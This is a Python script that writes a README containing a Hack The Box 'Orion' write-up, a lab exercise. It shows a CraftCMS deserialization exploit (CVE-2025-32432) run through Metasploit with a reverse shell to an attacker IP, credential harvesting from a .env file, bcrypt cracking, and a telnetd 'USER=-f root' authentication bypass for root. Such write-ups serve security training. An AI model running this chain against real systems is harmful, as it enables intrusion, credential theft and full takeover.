
readme_content = """<div align="center">

```
    ██████  ██▀███   ▒█████   ██▓ ███▄    █ 
  ▒██    ▒ ▓██ ▒ ██▒▒██▒  ██▒▓██▒ ██ ▀█   █ 
  ░ ▓██▄   ▓██ ░▄█ ▒▒██░  ██▒▒██▒▓██  ▀█ ██▒
    ▒   ██▒▒██▀▀█▄  ▒██   ██░░██░▓██▒  ▐▌██▒
  ▒██████▒▒░██▓ ▒██▒░ ████▓▒░░██░▒██░   ▓██░
  ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▓  ░ ▒░   ▒ ▒ 
  ░ ░▒  ░ ░  ░▒ ░ ▒░  ░ ▒ ▒░  ▒ ░░ ░░   ░ ▒░
  ░  ░  ░    ░░   ░ ░ ░ ░ ▒   ▒ ░   ░   ░ ░ 
        ░     ░         ░ ░   ░           ░ 
```

# 🔓 HTB Orion — Writeup

[![HTB](https://img.shields.io/badge/HackTheBox-Easy-2ea44f?style=for-the-badge&logo=hackthebox)](https://app.hackthebox.com/machines/Orion)
[![Platform](https://img.shields.io/badge/Platform-Linux-000000?style=for-the-badge&logo=linux)](https://www.linux.org/)
[![Status](https://img.shields.io/badge/Status-Rooted-ff0000?style=for-the-badge)](https://github.com/cosm3/htb-orion-writeup)
[![CVE](https://img.shields.io/badge/CVE-2025--32432-blue?style=for-the-badge)](https://nvd.nist.gov/vuln/detail/CVE-2025-32432)
[![CVE](https://img.shields.io/badge/CVE-2026--24061-blue?style=for-the-badge)](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)

**Machine:** Orion | **Difficulty:** Easy | **OS:** Linux | **IP:** `10.129.106.206`

> *"From CraftCMS deserialization to telnetd auth bypass — two CVEs, one shell, full root."*

</div>

---

## 📋 Table of Contents

- [Synopsis](#-synopsis)
- [Reconnaissance](#-reconnaissance)
- [Foothold: CVE-2025-32432](#-foothold-cve-2025-32432)
- [Lateral Movement: MySQL Credential Harvesting](#-lateral-movement-mysql-credential-harvesting)
- [Privilege Escalation: CVE-2026-24061](#-privilege-escalation-cve-2026-24061)
- [Flags](#-flags)
- [Tools Used](#-tools-used)
- [References](#-references)

---

## 🔍 Synopsis

Orion is an **Easy Linux machine** featuring a vulnerable **CraftCMS 5.6.16** instance. The attack chain involves:

1. **CSRF Validation Bypass** to reach the admin panel
2. **CVE-2025-32432** — Unauthenticated RCE via CraftCMS Image Transform deserialization
3. **MySQL credential extraction** from the `.env` file
4. **Password reuse** for SSH access as user `adam`
5. **CVE-2026-24061** — Telnetd authentication bypass for root access

---

## 🕵️ Reconnaissance

### Nmap Scan

```bash
nmap -sCV 10.129.106.206
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
```

### Host Resolution

```bash
echo "10.129.106.206 orion.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration

Visiting `http://orion.htb` reveals **Orion Telecom** — a telecom company website. Key findings:

- Footer exposes: **"Powered by CraftCMS"**
- Admin panel at: `http://orion.htb/admin/login`
- Version exposed: **Craft CMS 5.6.16** ⚠️

### Directory Enumeration

```bash
gobuster dir -u http://orion.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

| Path | Status | Notes |
|------|--------|-------|
| `/admin` | 302 → `/admin/login` | Admin panel |
| `/assets` | 301 | Asset directory |
| `/logout` | 302 | Logout endpoint |

---

## 🚪 Foothold: CVE-2025-32432

### Vulnerability Analysis

**CVE-2025-32432** is a deserialization vulnerability in CraftCMS's image transformation function. The `generate-transform` action accepts JSON data that instantiates arbitrary PHP classes, leading to **unauthenticated Remote Code Execution**.

### CSRF Bypass

CraftCMS requires CSRF tokens for admin actions. We bypass this by:

1. **Obtaining session cookies** from `/admin/login`
2. **Extracting the CSRF token** from the HTML response

```bash
# Get cookies
curl -s -c cookies.txt -b cookies.txt http://orion.htb/admin/login > login.html

# Extract CSRF Token
CSRF_TOKEN=$(grep -o 'csrfTokenValue":"[^"]*"' login.html | cut -d'"' -f4)
```

### Exploitation with Metasploit

```bash
msfconsole -q
```

```msf
search craftcms
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS 10.129.106.206
set VHOST orion.htb
set LHOST 10.10.16.33
set LPORT 4444
run
```

```
[*] Started reverse TCP handler on 10.10.16.33:4444
[*] Running automatic check
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Sending stage (45739 bytes) to 10.129.106.206
[*] Meterpreter session 1 opened (10.10.16.33:4444 -> 10.129.106.206:41978)
```

### Shell Stabilization

```bash
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🔄 Lateral Movement: MySQL Credential Harvesting

### Finding the .env File

```bash
find / -name ".env" 2>/dev/null
# /var/www/html/craft/.env
```

```bash
cat /var/www/html/craft/.env
```

```env
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

### Extracting User Credentials

```bash
mysql -u root -p'SuperSecureCraft123Pass!' -e "SELECT username, email, password FROM orion.users;"
```

| username | email | password |
|----------|-------|----------|
| admin | adam@orion.htb | `$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS` |

### Cracking the Hash

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
john hash.txt
```

```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```

### SSH Access

```bash
ssh adam@orion.htb
# Password: ********
```

---

## 🔐 Privilege Escalation: CVE-2026-24061

### Vulnerability Analysis

**CVE-2026-24061** affects **GNU inetutils telnetd 2.7**. The vulnerability allows **authentication bypass** by manipulating the `USER` environment variable. When `USER="-f root"` is passed, telnetd executes `login -f root`, skipping authentication entirely.

### Enumeration

```bash
netstat -tulnp | grep 23
# tcp  0  0 127.0.0.1:23  0.0.0.0:*  LISTEN

telnet --version
# telnet (GNU inetutils) 2.7
```

### Exploitation

```bash
USER="-f root" telnet -a 127.0.0.1
```

```
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Linux 5.15.0-171-generic (orion) (pts/2)
Welcome to Ubuntu 22.04.5 LTS

root@orion:~# whoami
root
```

---

## 🏁 Flags

```bash
# User Flag
cat /home/adam/user.txt
# 32ebe244f540b03fbe40f99********

# Root Flag
cat /root/root.txt
# [REDACTED — root your own box!]
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service enumeration |
| `gobuster` | Directory enumeration |
| `curl` | HTTP requests & CSRF token extraction |
| `Metasploit` | CVE-2025-32432 exploitation |
| `john` | Bcrypt hash cracking |
| `mysql` | Database credential extraction |
| `telnet` | CVE-2026-24061 exploitation |

---

## 📚 References

- [CVE-2025-32432 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-32432)
- [CVE-2026-24061 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)
- [CraftCMS Documentation](https://craftcms.com/docs/5.x/)
- [Hack The Box — Orion](https://app.hackthebox.com/machines/Orion)

---

<div align="center">

**`root@orion:~# cat /root/root.txt`**

*"The stars align for those who persist."* ⭐

[![GitHub](https://img.shields.io/badge/GitHub-cosm3-181717?style=for-the-badge&logo=github)](https://github.com/cosm3)

</div>
"""

with open('/mnt/agents/output/README.md', 'w', encoding='utf-8') as f:
    f.write(readme_content)

print("README.md generado correctamente")
print(f"Longitud: {len(readme_content)} caracteres")

